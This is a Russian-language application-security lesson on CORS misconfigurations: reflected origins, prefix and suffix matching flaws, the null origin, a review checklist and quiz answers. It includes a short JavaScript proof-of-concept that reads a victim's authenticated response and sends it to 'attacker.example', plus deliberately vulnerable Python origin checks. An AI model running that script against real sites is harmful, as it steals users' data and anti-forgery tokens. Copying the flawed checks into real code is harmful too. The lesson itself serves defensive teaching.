# Мисконфигурации CORS как вектор доступа

Уровень **L2** · время 33 мин (теория 20 / задача 8 / самопроверка 5,
оценка)

Что прочитать сначала: `cors`, `same-origin-policy`, `idor`.

CORS — способ сервера разрешить чужой странице читать ответ, и ошибка
в списке доверенных origin выдаёт это разрешение не тому. Тогда страница
атакующего читает данные пользователя из его собственной сессии. В работе
проверяющего вопрос один: кому именно выдано разрешение и вместе с чем.

Пример. Список доверенных origin в приложении сверяется концом строки:
адрес, кончающийся на `example.com`, считается своим. Вот запрос к
`/api/me` со страницы домена `notexample.com`, ушедший с cookie вошедшего
пользователя:

**Запрос со страницы атакующего**

```http
GET /api/me HTTP/1.1
Host: app.example.com
Origin: https://notexample.com
Cookie: session=a91Vt
```

**Ответ**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://notexample.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"login":"anna","email":"anna@example.com","csrf":"9f2b41c8"}
```

Запрос ушёл с cookie `anna`, потому что скрипт атакующего поставил
`withCredentials`. Приложение ответило штатно: сессия настоящая, точка
`/api/me` открыта её владельцу. Ответ прочитал не сам сайт `app.example.com`, а
скрипт с чужого домена, работавший в том же браузере, — потому что два
заголовка разрешения это позволили. Вместе с почтой уехал и токен, защищающий
формы от подделки.

Политика одного источника разрешает скрипту отправить запрос куда угодно и
запрещает прочитать ответ. CORS — способ снять именно этот запрет: сервер в
ответе называет origin, которому чтение разрешено. Разрешение выдаёт тот, у
кого просят данные, и выдаёт он его по значению из запроса. Ошибка в настройке
— это разрешение, выданное не тому.

Ничего другого CORS не решает: доступ к точке, права на объект и подлинность
сессии остаются за приложением. Между «мисконфигурацией CORS» и «утечкой данных
всех пользователей» лежат десять строк демонстрации. Прежде чем идти дальше,
ответьте себе: что из случившегося исчезло бы при сверке со списком целиком, а
что осталось, если из ответа убрать токен?

Механизм CORS, разбор его заголовков и канон настройки лежат в теме `cors` и
здесь не повторяются: тема отвечает на вопрос, что атакующий с ошибки
получает.

## 0. Коротко

CORS ослабляет политику одного
источника: он разрешает чужой странице **читать ответ**, который иначе был бы
ей недоступен. Ошибка в настройке превращает это
в канал доступа к данным: страница атакующего шлёт запрос к приложению с cookie
жертвы, получает разрешение и читает ответ. Чинится сверкой origin со списком
целиком, а не по подстроке, и отказом выдавать разрешение вместе с учётными
данными кому попало.

**Зачем это в работе AppSec-инженера.** Заголовок `Access-Control-Allow-Origin`
вы ставили сами — фронтенд лежал на другом адресе, и браузер отказывался
отдавать ответ скрипту. Чтобы не вести список, в разрешение возвращали то, что
пришло в `Origin`; чтобы список всё же был, сверяли его концом строки.
Настройка выглядит как задача про заголовки и оценивается как низкая находка,
пока не показан результат. Результат — скрипт на чужой странице, читающий
профиль, ключ API и токен защиты от подделки запроса. Собрать эту демонстрацию
должен ревьюер.

## 1. Цели

После этого раздела вы сможете:

1. Назвать, что атакующий читает при отражённом `Origin` и включённых учётных
   данных.
2. Найти ошибку сопоставления origin по префиксу, суффиксу и подстроке.
3. Показать, откуда берётся origin со значением `null`.
4. Оценить, что даёт цепочка «доверенный поддомен — XSS — чужие данные».

## 3. Механика

**Откуда это взялось.** Политика одного источника разрешает отправить запрос
куда угодно и запрещает прочитать ответ. Приложениям понадобилось обратное:
фронтенд на одном адресе, API на другом. Ослабление сделали управляемым — сервер
называет origin, которому доверяет. Ошибка появилась вместе с решением: список
доверенных надо вести, а ведение стоит работы, и его подменяют отражением
пришедшего значения. Отражение выглядит как выдача разрешения тому, кто уже
пришёл, а работает как разрешение всем.

### Что получает атакующий

Приём состоит из трёх условий: ответ несёт что-то ценное, разрешение выдаётся
origin атакующего, и разрешение выдано вместе с `Access-Control-Allow-Credentials:
true`. Тогда скрипт на чужой странице шлёт запрос с `withCredentials`, браузер
прикладывает cookie жертвы, а разрешение открывает чтение ответа. Ответ
`/api/me` из введения давал все три условия сразу. Скрипт решает три задачи:
заставить браузер приложить cookie жертвы, дождаться момента, когда сервер
разрешит чтение, и вынести прочитанное на узел атакующего. Выноски под
листингом ставят каждую задачу на свою строку.

```javascript
// УЯЗВИМО — демонстрация приёма, не для продакшена
const url = "https://vulnerable-website.com/sensitive-victim-data";
const req = new XMLHttpRequest();
req.open("get", url, true);
req.withCredentials = true;                    // (1)
req.onload = () => {                           // (2)
  const body = encodeURIComponent(req.responseText);
  location = "//attacker.example/log?d=" + body;
};
req.send();
```

1. Учётные данные прикладываются браузером: сессия жертвы работает в её же
   браузере.
2. Обработчик выполняется, только если сервер выдал разрешение читать. Без
   разрешения браузер отдаёт ошибку и тело скрипту не показывает.

Ценность добычи задаёт содержимое ответа. Профиль — утечка. Ключ API — доступ к
другим службам. Токен защиты от подделки запроса — превращение чтения в запись:
атакующий получает возможность отправлять запросы, которые иначе отверг бы
механизм защиты.

### Три ошибки сопоставления

Первая — отражение пришедшего значения без сверки: разрешение получает любой
origin.

Вторая — сверка по краю строки. Список ведут «по всем поддоменам» и проверяют
окончанием: адрес, кончающийся на `normal-website.com`, доверенный. Атакующий
регистрирует `hackersnormal-website.com`. Симметричная ошибка — проверка началом:
доверяют всему, что начинается с `normal-website.com`, и атакующий берёт
`normal-website.com.evil-user.net`. Домен `notexample.com` из введения устроен
так же.

Третья — доверие значению `null`. Спецификация допускает такой origin, и браузер
шлёт его в нескольких случаях. Это перенаправление между origin, запрос из
сериализованных данных, запрос со схемой `file:` и запрос из документа в
песочнице `iframe`. `null` попадает в списки как «для локальной разработки», а получить его
атакующий может сам — достаточно `iframe` с атрибутом `sandbox`.

### Цепочка через доверенный поддомен

Отдельный случай — правильный список, в котором стоит поддомен со своей
уязвимостью. Скрипт, внедрённый на `sub.example.com`, работает в origin из списка
доверенных. CORS здесь ничего не нарушает: он выполняет ровно то, что
настроено. Меняется цена уязвимости на второстепенном поддомене — она становится
ценой доступа к данным основного приложения.

## 5. Как выглядит в коде

Механику настройки читайте в теме `cors`. Со стороны вектора доступа ревьюер
задаёт три вопроса подряд. Строка, впустившая `notexample.com`, выглядит так —
до чтения выносок найдите в ней сами место, где решение принято неверно.

```python
# УЯЗВИМО — демонстрация, не для продакшена
origin = request.headers.get("Origin", "")
if origin.endswith("example.com"):                       # (1)
    resp.headers["Access-Control-Allow-Origin"] = origin  # (2)
    resp.headers["Access-Control-Allow-Credentials"] = "true"
```

1. Сверка по краю строки. Домен `notexample.com` проходит проверку.
2. Значение из запроса возвращается в разрешение. Вместе с учётными данными
   это открывает чтение ответа.

Обёртка, которая выглядит защитой: список origin, собранный через регулярное
выражение с незаэкранированной точкой — `https://.*\.example\.com` пропустит
`https://evil.example.com.attacker.net`, если выражение не привязано к концу
строки.

Ложное срабатывание: `Access-Control-Allow-Origin: *` без учётных данных на
публичном ответе. ASVS v5.0-3.4.2 требует в этом случае убедиться, что ответ не
несёт чувствительных сведений, — и на этом всё.

## 6. Как чинится

Канон настройки разобран в теме `cors`: сверка со списком целиком, `Vary: Origin`
за пределами условия, `null` в список не входит. Сверка списком целиком
отвергает `notexample.com` из введения на первом же сравнении. Со стороны
вектора доступа к этому добавляются два вопроса.

Первый: что лежит в ответе, который разрешено читать. Ключи, токены и чужие
идентификаторы из ответа убираются независимо от списка доверенных. В ответе из
введения таким лишним полем был токен защиты от подделки запроса.

Второй: не заменяет ли CORS проверку прав. Разрешение читать ответ — не
авторизация. Запрос уже выполнен сервером, и если чувствительное действие
вызывается запросом без предварительного круга, список origin его не остановит
(ASVS v5.0-3.5.2).

**Границы применимости.** Список доверенных origin закрывает чтение ответа
чужой страницей и не закрывает ничего внутри доверенного origin. Цена ведения
списка — правка при каждом новом поддомене фронтенда; цена ошибки в нём — доступ
к данным всех пользователей.

## 9. Ловушка

Утечка из введения началась с одной строки сверки, и в отчёте она называется
мисконфигурацией. Отсюда представление: настройка CORS относится к заголовкам и
браузерам, поэтому её ошибки — низкая находка про конфигурацию. Согласны ли вы
с такой оценкой?

**Ошибка в CORS даёт чтение чужих данных под сессией жертвы.** Механизм решает
единственный вопрос — можно ли чужой странице прочитать ответ, и ответ этот
приходит с cookie пользователя. Цепочка «про заголовки, значит, про
конфигурацию, значит, низкая оценка» ломается на последнем звене: оценивается
не слой, где случилась ошибка, а то, что она открывает.

Контрпример. Приложение отражает `Origin` и выдаёт `Allow-Credentials: true` на
точке `/api/me`. Страница атакующего читает оттуда почту, роль и токен защиты от
подделки запроса каждого, кто её открыл. Записи в отчёте «мисконфигурация CORS»
и «утечка персональных данных всех посетителей» описывают одну строку настройки.

## 10. Чеклист ревью

1. Проверьте, что значение `Access-Control-Allow-Origin` задано приложением либо
   сверено со списком доверенных origin целиком (ASVS v5.0-3.4.2).
2. Проверьте, что сверка origin не делается по началу строки, по концу строки или
   по вхождению подстроки.
3. Проверьте, что значение `null` не входит в список доверенных origin.
4. Проверьте, что `Access-Control-Allow-Credentials: true` выдаётся только тем
   origin, которым разрешено читать ответ с учётными данными.
5. Проверьте, что ответы, открытые для чтения из другого origin, не несут ключей,
   токенов и чужих идентификаторов.
6. Проверьте, что чувствительное действие нельзя вызвать запросом, который не
   порождает предварительного круга (ASVS v5.0-3.5.2).
7. Проверьте, что поддомены из списка доверенных проверены на внедрение скрипта:
   их origin получает доступ наравне с основным.

## 11. Задача

Возьмите точку API знакомого приложения, которая отдаёт что-нибудь про
пользователя, и отправьте к ней запрос с подставленным заголовком `Origin`.
Повторите четыре раза: чужой домен, домен с приписанным префиксом, домен с
приписанным суффиксом, значение `null`.

Одна подсказка: смотрите не только на `Access-Control-Allow-Origin`, но и на
`Access-Control-Allow-Credentials` — без второго заголовка чтение под сессией
жертвы не работает.

**Критерий выполнения** наблюдаемый: таблица из четырёх строк с присланным
`Origin` и двумя полученными заголовками. Отдельной строкой записано, какие из
четырёх значений приложение приняло.

## 12. Проверь себя

1. Строка сверки из другого приложения:

   ```python
   origin = request.headers.get("Origin", "")
   if origin.startswith("https://app.example.com"):
       resp.headers["Access-Control-Allow-Origin"] = origin
       resp.headers["Access-Control-Allow-Credentials"] = "true"
   ```

   Каким origin её обойдёт атакующий и что он получит вместе с разрешением?

2. Точка `/api/me` отражает пришедший `Origin` в разрешение и выдаёт
   `Allow-Credentials: true`. Какую починку вы выберете?

   А. Проверять, что пришедший origin оканчивается на доверенный домен: так
      список вести не придётся.
   Б. Сверять origin со списком доверенных целиком и убрать из ответа токены и
      ключи, которые там не нужны.
   В. Оставить в списке доверенных значение `null` для локальной разработки —
      настоящим сайтам оно не положено.

3. Почему разрешение CORS не заменяет проверку прав на действие, которое
   вызывается запросом без предварительного круга?

4. Не запуская, предскажите, какие строки выведет сверка из первого вопроса и
   что в выводе значит вторая.

   ```python
   def allowed(origin):
       return origin.startswith("https://app.example.com")

   for o in ["https://app.example.com", "https://app.example.com.evil.net"]:
       print(o, "->", "разрешён" if allowed(o) else "отказ")
   ```

5. Возврат к теме `same-origin-policy`: что именно запрещает политика и какую
   из её частей CORS ослабляет?
6. Возврат к теме `cors`: чем предварительный запрос отличается от основного и
   при каких типах содержимого его не бывает?

<details markdown="1">
<summary>Ответ 1</summary>

1. Сверка по началу строки примет `https://app.example.com.evil.net`: чужой
   домен начинается с доверенного. Вместе с `Allow-Credentials: true`
   разрешение открывает чтение ответа под сессией жертвы: браузер прикладывает
   её cookie, а скрипт на странице атакующего читает тело. Симметричная ошибка —
   сверка окончанием, она принимает `hackersnormal-website.com`.

</details>

<details markdown="1">
<summary>Ответ 2 и разбор вариантов</summary>

2. Верный ответ — Б.

   А. Сверка по концу строки принимает любой домен, оканчивающийся на
      доверенный: атакующий регистрирует `hackersnormal-website.com` и получает
      разрешение законно.
   Б. Список целиком отвергает чужой домен на первом сравнении, а вынос
      токенов из ответа снимает вторую половину вреда: разрешение читать —
      не повод отдавать лишнее.
   В. `null` получают намеренно — достаточно `iframe` с атрибутом `sandbox`.
      «Для локальной разработки» в списке означает «для любой страницы в
      песочнице».

</details>

<details markdown="1">
<summary>Ответ 3</summary>

3. Разрешение CORS касается чтения ответа и применяется после того, как сервер
   запрос уже выполнил. Действие без предварительного круга совершится независимо
   от списка origin — читать ответ атакующему и не нужно (ASVS v5.0-3.5.2).

</details>

<details markdown="1">
<summary>Ответ 4</summary>

4. Разрешены обе строки, и вторая — чужой домен:

   ```text
   $ python3 orig.py
   https://app.example.com -> разрешён
   https://app.example.com.evil.net -> разрешён
   ```

   Вторая строка значит, что сверка сравнивала край строки, а не сам origin:
   зарегистрированный атакующим домен получил разрешение наравне с настоящим.

</details>

<details markdown="1">
<summary>Ответ 5</summary>

5. Политика разрешает отправить запрос в чужой origin и запрещает прочитать
   ответ. CORS ослабляет вторую часть — чтение ответа, — и только её.

</details>

<details markdown="1">
<summary>Ответ 6</summary>

6. Предварительный запрос `OPTIONS` спрашивает разрешения до основного и сам
   данных не несёт; браузер шлёт его перед методами вроде `PUT` и запросами со
   своими заголовками. Его не бывает у `GET`, `HEAD` и `POST` с типами
   `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`.

</details>
